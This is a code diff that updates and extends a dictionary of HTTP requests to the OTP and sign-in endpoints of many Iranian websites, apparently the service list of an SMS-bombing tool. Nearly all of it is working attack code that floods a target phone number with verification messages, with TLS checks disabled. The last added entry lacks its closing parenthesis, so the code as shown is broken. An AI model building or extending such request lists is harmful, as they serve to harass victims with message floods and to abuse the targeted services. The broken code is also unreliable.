@@ -184,14 +184,6 @@ SERVICES = {
         verify=False
     ),
 
-    'bama': lambda num: requests.post(
-        url="https://bama.ir/signin-checkforcellnumber",
-        data=f"cellNumber={num}",
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
-        timeout=5,
-        verify=False
-    ),
-
     'bitbarg': lambda num: requests.post(
         url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
         json={"phone": num},
@@ -217,7 +209,7 @@ SERVICES = {
     ),
 
     'kilid': lambda num: requests.get(
-        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
+        url="https://kilid.com/api/uaa/portal/auth/v1/otp",
         params={"mobile": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -241,7 +233,7 @@ SERVICES = {
     ),
 
     'namava': lambda num: requests.post(
-        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request",
         json={"UserName": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -249,7 +241,7 @@ SERVICES = {
     ),
 
     'sheypoor': lambda num: requests.post(
-        url="https://www.sheypoor.com/auth",
+        url="https://www.sheypoor.com/api/v10.0.0/auth/send",
         json={"username": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -265,7 +257,7 @@ SERVICES = {
     ),
 
     'nobat': lambda num: requests.post(
-        url="https://nobat.ir/api/public/patient/login/phone",
+        url="https://api.nobat.ir/patient/login/phone",
         json={"mobile": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -281,7 +273,7 @@ SERVICES = {
     ),
 
     'simkhan': lambda num: requests.post(
-        url="https://www.simkhanapi.ir/api/users/registerV2",
+        url="https://simkhanapi.ir/api/users/registerV2",
         json={"mobileNumber": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -680,7 +672,81 @@ SERVICES = {
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
-    )
+    ),
+    
+    'bazar': lambda num: requests.post(
+        url="https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    
+    'tip': lambda num: requests.post(
+        url="https://tipnety.com/api/v1/auth/otp/send",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+
+    'hamrah': lambda num: requests.post(
+        url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
+        json={"PhoneNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'doctoryab': lambda num: requests.post(
+        url="https://doctor-yab.ir/Users/UserAjaxLogin",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'next': lambda num: requests.post(
+        url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'docdoc': lambda num: requests.post(
+        url="https://drdr.ir/api/v3/auth/login/mobile/init/",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+
+    'bama': lambda num: requests.post(
+        url="https://account.bama.ir/api/otp/generate/v4",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'khordro45': lambda num: requests.post(
+        url="https://khodro45.com/api/v2/customers/otp/",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'aparat': lambda num: requests.post(
+        url="https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage&theme=light&origin=https%3A%2F%2Fwww.aparat.com",
+        json={"account": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    
 }
 # ================== DATA ==================
 user_sessions = {}
